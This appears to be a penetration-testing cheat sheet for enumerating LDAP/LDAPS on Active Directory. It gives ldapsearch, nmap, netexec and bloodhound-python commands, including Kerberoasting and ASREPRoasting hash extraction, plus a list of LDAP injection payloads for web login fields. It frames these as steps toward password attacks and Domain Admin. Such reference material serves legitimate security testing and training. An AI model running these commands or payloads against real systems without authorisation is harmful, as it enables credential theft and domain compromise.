# LDAP/LDAPS Enumeration (389, 636)

## Run nmap LDAP scripts
```bash
nmap -n -sV --script "ldap* and not brute" $IP -p 389,636
```

## Query base naming context anonymously
```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts
```

## Search LDAP directory anonymously
```bash
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local"
```

## Enumerate all user objects
```bash
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

## Enumerate users with email addresses
```bash
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName mail userPrincipalName
```

## Search for specific user
```bash
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(sAMAccountName=administrator)"
```

## Enumerate all groups
```bash
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(objectClass=group)" cn
```

## Get Domain Admins group members
```bash
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(cn=Domain Admins)" member
```

## Enumerate administrative groups
```bash
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Schema Admins))" member
```

## Enumerate computer objects
```bash
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(objectClass=computer)" dNSHostName
```

## Find accounts with SPNs
```bash
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(servicePrincipalName=*)" servicePrincipalName
```

## Find service accounts with SPNs
```bash
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

## Enumerate with netexec anonymously
```bash
# Add --users --groups for comprehensive enumeration
netexec ldap $IP -u '' -p ''
```

## Authenticated LDAP search
```bash
ldapsearch -x -H ldap://$IP -D "username@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=user)"
```

## Get password policy
```bash
# netexec method (simpler) OR ldapsearch for detailed LDAP query
netexec ldap $IP -u username -p password --pass-pol
```

## ASREPRoast via LDAP with netexec
```bash
netexec ldap $IP -u username -p password --asreproast asrep.txt
```

## Kerberoast via LDAP with netexec
```bash
netexec ldap $IP -u username -p password --kerberoasting kerb.txt
```

## Connect to LDAPS with SSL
```bash
ldapsearch -x -H ldaps://$IP:636 -b "DC=domain,DC=local"
```

## Check LDAPS certificate
```bash
openssl s_client -connect $IP:636 -servername domain.local
```

## Collect BloodHound data via LDAP
```bash
bloodhound-python -d domain.local -u username -p password -gc $IP -c all
```

---

# LDAP/LDAPS Enumeration Methodology

## Initial Reconnaissance

1. Check if LDAP (389) or LDAPS (636) is open
2. Attempt anonymous bind
3. Query naming contexts to determine base DN
4. Enumerate users, groups, and computers
5. If anonymous fails, try with credentials
6. Look for password policy and SPNs

## Anonymous LDAP Access

**Why it matters:**
Many organizations allow anonymous LDAP binds for backward compatibility. This permits unauthenticated enumeration of the entire directory.

**What to enumerate:**
- All user accounts
- Group memberships
- Computer objects
- Service Principal Names (SPNs)
- Organizational structure

**Testing for anonymous access:**
Use empty credentials (`-x` flag with ldapsearch) or empty strings with netexec.

## Base DN Discovery

**Naming contexts query:**
Always start by querying for naming contexts. This reveals the base DN (e.g., DC=domain,DC=local) which is required for all subsequent queries.

**Common base DNs:**
- DC=domain,DC=local
- DC=company,DC=com
- O=organization

## User Enumeration

**Important user attributes:**
- sAMAccountName: Windows username
- userPrincipalName: UPN (user@domain.local)
- mail: Email address
- memberOf: Group memberships
- servicePrincipalName: Service accounts
- userAccountControl: Account flags
- pwdLastSet: Password age

**Finding admin accounts:**
Look for users in Domain Admins, Enterprise Admins, or Schema Admins groups.

## Group Enumeration

**Key groups to enumerate:**
- Domain Admins
- Enterprise Admins
- Schema Admins
- Account Operators
- Backup Operators
- Server Operators
- Print Operators

**Group attributes:**
- cn: Common name
- member: Group members
- memberOf: Parent groups

## Computer Enumeration

**Computer object attributes:**
- dNSHostName: Fully qualified domain name
- operatingSystem: OS version
- servicePrincipalName: Services running
- userAccountControl: Computer flags

**Why enumerate computers:**
- Identify domain controllers
- Find Windows servers for targeting
- Discover workstations

## Service Principal Names (SPNs)

**What are SPNs:**
Service accounts register SPNs for Kerberos authentication. Finding accounts with SPNs is critical for Kerberoasting.

**Common SPNs:**
- MSSQLSvc: SQL Server
- HTTP: Web services
- TERMSRV: RDP
- WSMAN: WinRM

**SPN format:**
service_class/host:port/service_name

## LDAP Filters

**Basic filters:**
- (objectClass=user): All users
- (objectClass=computer): All computers
- (objectClass=group): All groups
- (objectClass=*): All objects

**Complex filters:**
- (&(objectClass=user)(servicePrincipalName=*)): Service accounts
- (!(userAccountControl:1.2.840.113556.1.4.803:=2)): Enabled accounts
- (userAccountControl:1.2.840.113556.1.4.803:=65536): Non-expiring passwords

**Logical operators:**
- & : AND
- | : OR
- ! : NOT

## Password Policy Enumeration

**Why it matters:**
Password policy determines:
- Minimum password length
- Complexity requirements
- Account lockout threshold
- Lockout duration

This guides password spraying and brute force attempts.

## Authenticated LDAP Queries

**When to use:**
If anonymous access is denied, use any valid domain credentials.

**Authentication methods:**
- Simple bind: username and password
- SASL: More secure, supports various mechanisms
- Kerberos: Using ticket (pass-the-ticket)

## LDAPS (Secure LDAP)

**Port 636:**
LDAP over SSL/TLS for encrypted communication.

**Certificate inspection:**
Check certificate validity and configuration with openssl.

**StartTLS:**
Upgrade plain LDAP connection to encrypted (port 389 with STARTTLS).

## BloodHound Collection

**bloodhound-python:**
Collects comprehensive AD data via LDAP for graphical analysis in BloodHound.

**What it collects:**
- User accounts and properties
- Group memberships
- Computer objects
- Trusts and permissions
- ACLs and delegation

**Analysis:**
Import into BloodHound GUI to visualize attack paths to Domain Admin.

## netexec LDAP Module

**Advantages:**
- Quick enumeration
- Password policy extraction
- ASREPRoasting support
- Kerberoasting support
- Pass-the-hash capable

**Use cases:**
- Quick user/group enumeration
- Integrated Kerberos attacks
- Password policy checks

## LDAP Injection

**Testing web apps:**
If web application uses LDAP for authentication, test for injection:

**Basic payloads:**
```
*)(uid=*))(|(uid=*
*)(cn=*))(|(cn=*
*))%00
admin)(&
admin)(|(password=*
```

**Injection points:**
- Username fields
- Search parameters
- Filters in web apps

## Common LDAP Attributes

**User attributes:**
- sAMAccountName
- userPrincipalName
- mail
- memberOf
- servicePrincipalName
- userAccountControl
- pwdLastSet

**Computer attributes:**
- dNSHostName
- operatingSystem
- servicePrincipalName

**Group attributes:**
- cn
- member
- memberOf

## Enumeration Checklist

- [ ] Anonymous LDAP bind testing
- [ ] Base DN discovery
- [ ] User enumeration
- [ ] Group enumeration (focus on admins)
- [ ] Computer enumeration
- [ ] SPN discovery for Kerberoasting
- [ ] Password policy extraction
- [ ] Administrative group membership
- [ ] Trust relationship discovery
- [ ] BloodHound data collection

## Common Misconfigurations

1. **Anonymous LDAP bind enabled**
2. **Excessive information disclosure**
3. **Weak ACLs on sensitive objects**
4. **Unencrypted LDAP** (port 389 without TLS)
5. **Service accounts with SPNs** and weak passwords

## Next Steps

Once LDAP enumeration succeeds:
1. Use discovered users for password attacks
2. Target service accounts for Kerberoasting
3. Analyze group memberships for privilege escalation
4. Map domain structure for lateral movement
5. Import BloodHound data for attack path analysis

---

# References

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md
- https://bloodhound.readthedocs.io/en/latest/
